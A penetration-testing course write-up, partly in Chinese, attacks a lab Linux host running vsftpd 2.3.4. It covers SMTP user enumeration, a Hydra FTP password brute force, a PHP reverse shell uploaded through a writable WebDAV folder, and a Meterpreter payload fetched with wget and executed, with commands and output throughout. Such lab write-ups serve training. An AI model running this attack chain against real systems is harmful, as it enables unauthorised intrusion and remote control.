---
layout: post
title: "Targeting vsFTPd"
date: "2023-05-14"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Linux Black Box Penetration Test（Linux 黑盒渗透测试）
## Targeting vsFTPd（针对 vsFTPd）
# Demo: Targeting vsFTPd（演示：针对 vsFTPd）
We're going to be taking a look at how to exploit the FTP service that's running on the Linux target. We've already covered the process of exploiting FTP on a Windows system, and that was fairly straightforward via a brute force attack. However, we're going to be exploring addtional techniques that can be used to exploit an FTP server as well as exploring how we can use our access that we will obtain with FTP to obtain a reverse shell on the target system.

`-sV`: perform a service version detection scan.

`-sC`: the default Nmap script scan.

```
nmap -sV -sC -p 21 10.2.17.5
```

It ran the ftp-anon script to check for anonymous FTP logins, and FTP anonymous logins are allowed, which means we can log into the FTP server without providing a password.

Let's try and see whether we can gain access to the target system with the FTP client without providing any legitimate credentials or just anonymous credentials. 

```
ftp 10.2.17.5 21

anonymous
```

Login successful.

```
ftp> ls
ftp> cd /
ftp> ls
ftp> pwd
ftp> exit
```

We're still working within the folder that has been configured for the FTP server.

In the previous section when we were covering Windows exploitation, the FTP server was working in conjunction with the web server, in that the FTP service was providing you with access to the files that are within the web server directory or the folder that is used to host the web application or the multiple web application. However, in this case with anonymous access, it doesn't look like we can access any directory.

We have logged in, but we can't access any files here. And that all comes down to anonymous access and what anonymous users are allowed to do.

We were able to identify a vulnerability within vsftpd 2.3.4.

```
searchsploit vsftpd
searchsploit -m 49757
vim 49757.py
```

portFTP: This is where you can modify the FTP port if the target system is running vsftpd on a different port apart from the default one.

It authenticates with very basic credentials here, and it then initiates a Telnet connection right over here to port 6200 running on the target system.

And I'll explain what's happening here and why this exploit will fail, even if you use the Metasploit exploit module.

```
chmod +x 49757.py
```

```
python3 49757.py 10.2.17.5
```

Why is it saying connection refused? It all comes down to the vulnerability within vsftpd 2.3.4. This specific version of vsftpd has a vulnerability within it, and more specifically within 2.3.4. What happened here is that somehow attackers were able to modify the source code for this specific version of vsftpd. And as part of that, they included a backdoor within the service itself. And the backdoor would set up a bind listener on port 6200. And as a result, an attacker could easily gain access to the target system by connecting to that bind listener via netcat or telnet or whatever other client you want to utilize. And in this case, what has happened is the administrator of the Linux system has gotten rid of that backdoor. 

```
vim 49757.py
```

It connects with Telnet. It specifies the target IP and then port 6200.

```
nmap -p 6200 10.2.17.5
```

```
PORT     STATE  SERVICE
6200/tcp closed lm-x
```

That highlights the fact that the backdoor was removed by the administrator.

```
msfconsole
search vsftpd
use 0
set RHOSTS 10.2.17.5
show info
```

The point here being is that that backdoor has been disabled by the administrator. If it wasn't disabled and port 6200 was open, then we would have been able to obtain a telnet session or rather a standard bash session on the target system.

```
exploit
```

The main lesson here that I wanted to highlight is that in most cases or in some cases, exploits will not work because they may have been patched, and that's something that you have to understand as a penetration tester. You have to understand that from the perspective of a system administrator, whenever there's a vulnerability discovered, they have the ability to update the affected service or they can patch it manually. And one of the patching techniques in this case is to get rid of that backdoor, or to block that port from being accessed via a firewall.

```
rm 49757.py
```

The next step is to perform a brute force attack.

The Linux target system is running SMTP. 

```
nmap -sV -p 25 10.2.17.5
```

```
PORT     STATE SERVICE     VERSION
25/tcp   open  smtp        Postfix smtpd
```
 
SMTP provides us with a easy way of identifying user accounts on a target system, and in this case, a Linux target system. It can help us narrow down our brute force attack in terms of obtaining legitimate credentials that can provide us with access to the target system via FTP and consequently provide us with access through a reverse shell.

How can we perform a brute force on SMTP and identify system accounts really easily?

```
msfconsole
search smtp_enum
use 0
show options
set RHOSTS 10.2.17.5
run
exit
```

We should be able to identify user accounts on the system that we can then use to narrow down our brute force attack or to make our brute force attack more efficient.

The enumeration process is complete. It did find valid user and service accounts.

These are all valid service accounts, which are very different than user accounts on the target system. And we can utilize this to narrow down our FTP brute force attack.

And the account that I'm particularly interested in is the one called service, because there isn't a service called serivce. Service accounts are typically named after the service that they are used to manage.

In order to perform the FTP brute force:

```
hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.17.5 ftp
```

```
[21][ftp] host: 10.2.17.5   login: service   password: service
```

You can perform a brute force attack for the user account here, the user account called user.

And the reason why I'm saying why you shouldn't perform a brute force attack on the service accounts, is they don't have any passwords. Performing a brute force attack on them will not yield any results. So you need to be able to identify or differentiate user accounts from service accounts.

Now that we have identified legitimate credentials, we can log in to the FTP server.

```
ftp 10.2.17.5 21

service
service
```

Login successful.

Print my current working directory.

```
ftp> pwd
Remote directory: /home/service
```

That's a user account. And the reason I'm able to tell that is because the home directory for this account is stored in the /home directory. 

```
ftp> ls
ftp> cd /
ftp> ls
```

We can now navigate around the entire Linux file system make changes, upload files, download files, etc.

As an attacker, we can look for data, exfiltrate data. This is as good as having access on the target system, with a few exceptions, in that we cannot execute commands that you typically would be able to execute if you had a reverse shell on the target system.

The target system is running a web server.

```
http://10.2.17.5/
```

We have multiple web applications. What WebDAV is used for in regards to storing of files and the sharing of documents.

```
http://10.2.17.5/dav/
```

We can use this folder to upload any files that we would like to upload. If we wanted to gain a reverse shell, we can upload a PHP reverse shell to this directory and then execute it or launch it with the browser and we shoule receive a reverse shell if we set up the netcat listener.

How do we obtain a reverse shell? The easiest way we can obtain one is either to generate one with msfvenom, or alternatively, take advantage of Kali Linux system.

```
ls -al /usr/share/webshells/
ls -al /usr/share/webshells/php/
```

If you're not familiar with Apache and Linux and the LAMP stack in general, why we're uploading PHP. If you remember in the previous section, where we were covering Windows exploitation, the web server technology was Microsoft IIS, which meant that the only file extensions that could be executed were ASP or ASPX. In the context of Apache and Linux, that is going to be PHP. So we need a PHP reverse shell.

```
cp /usr/share/webshells/php/php-reverse-shell.php .
ls
mv php-reverse-shell.php shell.php
ls
vim shell.php
```

Kali Linux: 10.10.11.2

```
$ip = '10.10.11.2';
$port = 1234;
```

Reverse shells involve the target connecting back to the attacker system.

```
ftp 10.2.17.5 21

service
service

ftp> cd /
ftp> ls
```

The default directory where Apache stores all of its data is under `/var/www`.

```
ftp> cd /var/www
ftp> ls
```

```
ftp> put shell.php
```

It's going to say could not create file. That's because we don't have the necessary permissions to upload files with our current access or the credentials that we currently got. The only folder that we can make changes to that can be used to execute PHP is the dav directory. 

```
ftp> cd dav
ftp> put shell.php
```

```
nc -nvlp 1234
```

```
http://10.2.17.5/dav/
```

Once I click on shell.php, it's going to be executed right over here on the server side, and it will connect to our Kali Linux IP on the listener or on the port that we are currently listening on.

We get a connection and we are provided with a bone shell session, and the current user that we have access is www-data. That is a service account that is used to manage Apache.

We can obtain a bash session by saying:

```
sh-3.2$ /bin/bash -i
```

And we currently have access as an unprivileged service account user, but nonetheless we have still obatained access to the target system.

```
www-data@d1d6a9361621:/$ id
www-data@d1d6a9361621:/$ cd /root
www-data@d1d6a9361621:/root$ ls
www-data@d1d6a9361621:/root$ cd /var/www
www-data@d1d6a9361621:/var/www$ ls
```

And given our current permissions, we can now upload files to any directory that we want as opposed to when we had access via the service account via ftp.

That is how to obtain a reverse shell via FTP on Linux.  

In the Windows exploitation section, we weren't able to obtain a reverse shell because ASP files were not being executed or ASP reverse shells were not being executed, so we had to find another way around that. And in this case, we've been able to get an initial foothold on the target system.

We were able to take a look at how to utilize multiple techniques and leverage multiple services like SMTP to enumerate as much information as possible from the target system. And in this case, you were able to see how to utilize informtaion from other services to stage an attack for a specific service like FTP. And we've explored the concept of not having exploits work or having vulnerabilities being patched and how to work around that. So you should never give up in regards to identifying vulnerabilities and always be open minded when it comes down to also targeting other services that can provide you with useful information that can help you attack a specific service, like FTP, for exmaple.

# Targeting vsFTPd（针对 vsFTPd）
## Overview（概述）
Goal

The objective of this lab is to outline the various techniques that can be used to exploit an FTP server running on a Linux target.

目标

本实验的目的是概述可用于利用在 Linux 目标上运行的 FTP 服务器的各种技术。

## Tasks（任务）
Pre-requisites

1. Basic familiarity with Nmap.
2. Basic familiarity with the Metasploit Framework.

Requirements

This task does not have any requirements.

先决条件

1. 基本熟悉 Nmap。
2. 基本熟悉 Metasploit 框架。

要求

此任务没有任何要求。

## 复现视频内容

10.0.22.55    demo.ine.local

Kali Linux : 10.10.16.2

```
root@attackdefense:~# nmap -sV -sC -p 21 10.0.22.55
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 15:18 IST
Nmap scan report for demo.ine.local (10.0.22.55)
Host is up (0.0033s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.17.0.2 is not the same as 10.0.22.55
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
```

```
root@attackdefense:~# ftp 10.0.22.55 21
Connected to 10.0.22.55.
220 (vsFTPd 2.3.4)
Name (10.0.22.55:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

```
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||14639|).
ftp: Can't connect to `10.0.22.55:14639': Connection refused
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> cd /
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> exit
221 Goodbye.
```

```
root@attackdefense:~# searchsploit vsftpd
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                            | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                            | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                            | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                          | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                 | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                    | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                                                                                                   | multiple/remote/49719.py
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
root@attackdefense:~# searchsploit -m 49757
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
File Type: Python script, ASCII text executable

Copied to: /root/49757.py


root@attackdefense:~# vim 49757.py
```

```
root@attackdefense:~# chmod +x 49757.py 
root@attackdefense:~# python3 49757.py 10.0.22.55
Traceback (most recent call last):
  File "/root/49757.py", line 37, in <module>
    tn2=Telnet(host, 6200)
  File "/usr/lib/python3.9/telnetlib.py", line 218, in __init__
    self.open(host, port, timeout)
  File "/usr/lib/python3.9/telnetlib.py", line 235, in open
    self.sock = socket.create_connection((host, port), timeout)
  File "/usr/lib/python3.9/socket.py", line 844, in create_connection
    raise err
  File "/usr/lib/python3.9/socket.py", line 832, in create_connection
    sock.connect(sa)
ConnectionRefusedError: [Errno 111] Connection refused
```

```
root@attackdefense:~# nmap -p 6200 10.0.22.55
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 15:35 IST
Nmap scan report for demo.ine.local (10.0.22.55)
Host is up (0.0028s latency).

PORT     STATE  SERVICE
6200/tcp closed lm-x

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

```
root@attackdefense:~# msfconsole -q
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > setg RHOSTS 10.0.22.55
RHOSTS => 10.0.22.55
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show info

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS  10.0.22.55       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the 
  VSFTPD download archive. This backdoor was introduced into the 
  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
  according to the most recent information available. This backdoor 
  was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
```

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.0.22.55:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.22.55:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

```
root@attackdefense:~# nmap -sV -p 25 10.0.22.55
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 15:45 IST
Nmap scan report for demo.ine.local (10.0.22.55)
Host is up (0.0029s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
Service Info: Host:  metasploitable.localdomain

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
```

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search smtp_enum

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use 0
msf6 auxiliary(scanner/smtp/smtp_enum) > info

       Name: SMTP User Enumeration Utility
     Module: auxiliary/scanner/smtp/smtp_enum
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Heyder Andrade <heyder@alligatorteam.org>
  nebulus

Check supported:
  No

Basic options:
  Name       Current Setting                                                Required  Description
  ----       ---------------                                                --------  -----------
  RHOSTS     10.0.22.55                                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT      25                                                             yes       The target port (TCP)
  THREADS    1                                                              yes       The number of concurrent threads (max one per host)
  UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
  USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.

Description:
  The SMTP service has two internal commands that allow the 
  enumeration of users: VRFY (confirming the names of valid users) and 
  EXPN (which reveals the actual address of users aliases and lists of 
  e-mail (mailing lists)). Through the implementation of these SMTP 
  commands can reveal a list of valid users.

References:
  http://www.ietf.org/rfc/rfc2821.txt
  OSVDB (12551)
  https://nvd.nist.gov/vuln/detail/CVE-1999-0531
```

```
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.0.22.55:25         - 10.0.22.55:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)

[+] 10.0.22.55:25         - 10.0.22.55:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
[*] 10.0.22.55:25         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
```

```
root@attackdefense:~# hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.0.22.55 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-14 16:00:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 168 login tries (l:1/p:168), ~11 tries per task
[DATA] attacking ftp://10.0.22.55:21/
[21][ftp] host: 10.0.22.55   login: service   password: service
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-14 16:01:23
```

```
root@attackdefense:~# hydra -l user -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.0.22.55 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-14 16:03:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 168 login tries (l:1/p:168), ~11 tries per task
[DATA] attacking ftp://10.0.22.55:21/
[21][ftp] host: 10.0.22.55   login: user   password: user
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-14 16:03:51
```

```
[21][ftp] host: 10.0.22.55   login: service   password: service
[21][ftp] host: 10.0.22.55   login: user   password: user
```

```
root@attackdefense:~# ftp 10.0.22.55 21
Connected to 10.0.22.55.
220 (vsFTPd 2.3.4)
Name (10.0.22.55:root): service
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /home/service
ftp> ls
229 Entering Extended Passive Mode (|||41126|).
ftp: Can't connect to `10.0.22.55:41126': Connection refused
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> cd /
250 Directory successfully changed.
ftp> pwd
Remote directory: /
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    1 0        0            4096 Jan 28  2018 bin
drwxr-xr-x    4 0        0            4096 May 14  2012 boot
lrwxrwxrwx    1 0        0              11 Apr 28  2010 cdrom -> media/cdrom
-rw-------    1 0        0         1499136 Jan 28  2018 core
drwxr-xr-x    5 0        0             400 May 14 09:45 dev
drwxr-xr-x    1 0        0            4096 May 20  2021 etc
drwxr-xr-x    1 0        0            4096 Apr 16  2010 home
drwxr-xr-x    2 0        0            4096 Mar 16  2010 initrd
lrwxrwxrwx    1 0        0              32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x    1 0        0            4096 Jan 28  2018 lib
drwx------    2 0        0            4096 Mar 16  2010 lost+found
drwxr-xr-x    4 0        0            4096 Mar 16  2010 media
drwxr-xr-x    3 0        0            4096 Jul 17  2017 mnt
-rw-------    1 0        0           15915 May 14 09:45 nohup.out
drwxr-xr-x    2 0        0            4096 Mar 16  2010 opt
dr-xr-xr-x  247 0        0               0 May 14 09:44 proc
drwxr-xr-x    1 0        0            4096 May 20  2021 root
drwxr-xr-x    2 0        0            4096 May 14  2012 sbin
drwxr-xr-x    2 0        0            4096 Mar 16  2010 srv
dr-xr-xr-x   13 0        0               0 May 14 09:44 sys
drwxrwxrwt    1 0        0            4096 May 14 10:25 tmp
drwxr-xr-x    1 0        0            4096 Apr 28  2010 usr
drwxr-xr-x    1 0        0            4096 May 20  2012 var
lrwxrwxrwx    1 0        0              29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
226 Directory send OK.
```

因为目标80端口的Web服务挂了，所以重启了Lab。

10.0.22.175    demo.ine.local

Kali Linux : 10.10.16.2

```
http://10.0.22.175/
```

```
http://10.0.22.175/dav/
```

Apache/2.2.8 (Ubuntu) DAV/2 Server at 10.0.22.175 Port 80

```
root@attackdefense:~# ls -al /usr/share/webshells/
asp/      aspx/     cfm/      jsp/      laudanum/ perl/     php/      seclists/ 
root@attackdefense:~# ls -al /usr/share/webshells/php
total 44
drwxr-xr-x 3 root root  4096 Jan 12  2022 .
drwxr-xr-x 8 root root  4096 Jan 12  2022 ..
drwxr-xr-x 2 root root  4096 Jan 12  2022 findsocket
-rw-r--r-- 1 root root  2800 Nov 21  2021 php-backdoor.php
-rwxr-xr-x 1 root root  5491 Nov 21  2021 php-reverse-shell.php
-rw-r--r-- 1 root root 13585 Nov 21  2021 qsd-php-backdoor.php
-rw-r--r-- 1 root root   328 Nov 21  2021 simple-backdoor.php
```

```
root@attackdefense:~# cp /usr/share/webshells/php/php-reverse-shell.php .
root@attackdefense:~# ls
Desktop  php-reverse-shell.php  thinclient_drives
root@attackdefense:~# mv php-reverse-shell.php shell.php
root@attackdefense:~# ls
Desktop  shell.php  thinclient_drives
root@attackdefense:~# vim shell.php
```

```
$ip = '10.10.16.2';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

```
root@attackdefense:~# ftp 10.0.22.175 21
Connected to 10.0.22.175.
220 (vsFTPd 2.3.4)
Name (10.0.22.175:root): service
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /home/service
```

```
ftp> cd /var/www
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxrwxrwt    2 0        0            4096 May 20  2012 dav
drwxr-xr-x    8 33       33           4096 May 20  2012 dvwa
-rw-r--r--    1 33       33            891 May 20  2012 index.php
drwxr-xr-x   10 33       33           4096 May 14  2012 mutillidae
drwxr-xr-x   11 33       33           4096 May 14  2012 phpMyAdmin
-rw-r--r--    1 33       33             19 Apr 16  2010 phpinfo.php
drwxr-xr-x    3 33       33           4096 May 14  2012 test
drwxrwxr-x   22 33       33          20480 Apr 19  2010 tikiwiki
drwxrwxr-x   22 33       33          20480 Apr 16  2010 tikiwiki-old
drwxr-xr-x    7 33       33           4096 Apr 16  2010 twiki
226 Directory send OK.
ftp> put shell.php
local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
553 Could not create file.
ftp> pwd
Remote directory: /var/www
```

```
ftp> cd dav
250 Directory successfully changed.
ftp> pwd
Remote directory: /var/www/dav
ftp> put shell.php
local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
100% |***********************************************************************************************************************************************|  5491       43.27 MiB/s    00:00 ETA
226 Transfer complete.
5491 bytes sent in 00:00 (1.04 MiB/s)
```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

```
http://10.0.22.175/dav/
http://10.0.22.175/dav/shell.php
```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.22.175.
Ncat: Connection from 10.0.22.175:44984.
Linux d1d6a9361621 5.4.0-1048-aws #50-Ubuntu SMP Mon May 3 21:44:17 UTC 2021 x86_64 GNU/Linux
 07:21:18 up 23 min,  1 user,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: no job control in this shell
sh-3.2$ /bin/bash -i
/bin/bash -i
bash: no job control in this shell
www-data@d1d6a9361621:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@d1d6a9361621:/$ cd /root
cd /root
www-data@d1d6a9361621:/root$ ls
ls
Desktop
reset_logs.sh
vnc.log
www-data@d1d6a9361621:/root$ cd /var/www
cd /var/www
www-data@d1d6a9361621:/var/www$ ls
ls
dav
dvwa
index.php
mutillidae
phpMyAdmin
phpinfo.php
test
tikiwiki
tikiwiki-old
twiki
```

```
www-data@d1d6a9361621:/var/www$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
```

```
www-data@d1d6a9361621:/$ cat /etc/shadow
cat /etc/shadow
cat: /etc/shadow: Permission denied
```

```
root@attackdefense:~# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f elf > shell-x64.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
root@attackdefense:~# ls
Desktop  shell.php  shell-x64.elf  thinclient_drives
root@attackdefense:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

```
www-data@d1d6a9361621:/$ cd /var/www
cd /var/www
www-data@d1d6a9361621:/var/www$ wget http://10.10.16.2/shell-x64.elf
wget http://10.10.16.2/shell-x64.elf
--07:38:56--  http://10.10.16.2/shell-x64.elf
           => `shell-x64.elf'
Connecting to 10.10.16.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250 [application/octet-stream]

    0K                                                       100%   31.28 MB/s

07:38:56 (31.28 MB/s) - `shell-x64.elf' saved [250/250]
```

```
www-data@d1d6a9361621:/var/www$ ls
ls
dav
dvwa
index.php
mutillidae
phpMyAdmin
phpinfo.php
shell-x64.elf
test
tikiwiki
tikiwiki-old
twiki
```

```
root@attackdefense:~# msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.16.2
LHOST => 10.10.16.2
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.2:4444 

```

```
www-data@d1d6a9361621:/var/www$ chmod +x shell-x64.elf
chmod +x shell-x64.elf
www-data@d1d6a9361621:/var/www$ ./shell-x64.elf
./shell-x64.elf

```

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Sending stage (3012548 bytes) to 10.0.22.175
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.22.175:33008 ) at 2023-05-14 17:15:02 +0530

meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Ubuntu 8.04 (Linux 5.4.0-1048-aws)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: www-data
```

还是需要提权。